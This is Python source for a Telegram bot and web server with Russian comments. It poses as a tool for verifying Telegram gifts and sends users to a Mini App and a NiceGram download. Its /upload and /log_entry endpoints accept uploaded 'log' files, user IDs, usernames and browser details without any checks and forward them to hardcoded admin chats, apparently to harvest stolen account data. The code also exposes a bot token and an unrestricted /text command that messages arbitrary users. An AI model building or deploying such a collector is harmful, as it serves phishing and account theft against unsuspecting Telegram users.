import asyncio
import logging
import os
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo, BufferedInputFile, FSInputFile

# =====================================================
# ПАРАМЕТРЫ НАСТРОЙКИ
# =====================================================
API_TOKEN = '8439799164:AAFotVWDo_h2czyT5JZtcyeKTIk6aXqZIo8'
# ID админов оставил только для того, чтобы бот знал, куда отправлять логи
ADMIN_IDS = [5166593577, 760217595] 
WEB_APP_URL = "https://nicebot.vercel.app/"
# =====================================================

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- УТИЛИТЫ ---

def get_all_admins():
    return ADMIN_IDS

# --- БОТ (КОМАНДЫ) ---

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))],
        [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
    ])
    
    # Обновленный текст
    text_content = (
        "🖐Привет! Я — бот который поможет более детально узнать о вашем подарке, "
        "от его покупки до того за какие звёзды они были куплены,помогу отличить реальный подарок от чистого визуала!"
    )
    
    # Пытаемся отправить фото. Если файла нет, отправит просто текст с ошибкой в лог
    try:
        # Убедитесь, что файл nicegram2.jpg лежит в папке с ботом
        photo = FSInputFile("nicegram2.jpg")
        await message.answer_photo(photo=photo, caption=text_content, reply_markup=markup)
    except Exception as e:
        logging.error(f"Не удалось отправить фото (проверьте наличие nicegram2.jpg): {e}")
        # Если фото не найдено, отправляем просто текст, чтобы бот не молчал
        await message.answer(text_content, reply_markup=markup)

@router.message(Command("text"))
async def cmd_text(message: types.Message):
    # Ограничение на админа УБРАНО. Любой может использовать эту команду.
    
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("❌ Используйте: /text <user_id> <сообщение>")
        return
    
    try:
        user_id = int(args[1])
        text_to_send = args[2]
        await bot.send_message(chat_id=user_id, text=text_to_send)
        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

# --- ВЕБ-СЕРВЕР ---

routes = web.RouteTableDef()

@routes.get("/")
async def root(request):
    return web.Response(text="OK")

@routes.post('/log_entry')
async def handle_log_entry(request: web.Request):
    # Принимаем данные без проверок
    try:
        data = await request.json()
        
        user_id = str(data.get('user_id', '0000'))
        username = data.get('username', 'не указан')
        ua = data.get('user_agent', 'неизвестен')

        msg = (f"🚀 **Вход в Mini App**\n"
               f"👤 Юзер: @{username} (ID: {user_id})\n"
               f"📱 Устройство: `{ua}`")

        for admin_id in get_all_admins():
            try:
                await bot.send_message(admin_id, msg, parse_mode="Markdown")
            except: pass
            
        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in log: {e}")
        return web.Response(status=500)

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    # Принимаем файлы без проверок
    try:
        reader = await request.multipart()
        
        user_id = "0000"
        username = "Unknown"
        ua = "Unknown"
        file_data = None
        filename = "data.json"

        while True:
            part = await reader.next()
            if part is None: break
            
            if part.name == 'user_agent': 
                ua = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'user_id':
                user_id = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'username':
                username = (await part.read_chunk()).decode('utf-8')
            elif part.name == 'file':
                filename = part.filename or "data.json"
                file_data = await part.read()

        if file_data:
            caption_text = (f"🚨 Новый лог!\n"
                            f"User ID: {user_id}\n"
                            f"Username: @{username}\n"
                            f"Браузер: {ua}")

            for admin_id in get_all_admins():
                try:
                    await bot.send_document(
                        chat_id=admin_id,
                        document=BufferedInputFile(file_data, filename=filename),
                        caption=caption_text
                    )
                except Exception as e:
                    logging.error(f"Failed to send doc to admin: {e}")

        return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
    except Exception as e:
        logging.error(f"Error in upload: {e}")
        return web.Response(status=500)

@routes.options('/upload')
@routes.options('/log_entry')
async def handle_options(request):
    return web.Response(headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type, X-Telegram-Init-Data"
    })

async def main():
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"Сервер запущен на порту {port}")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
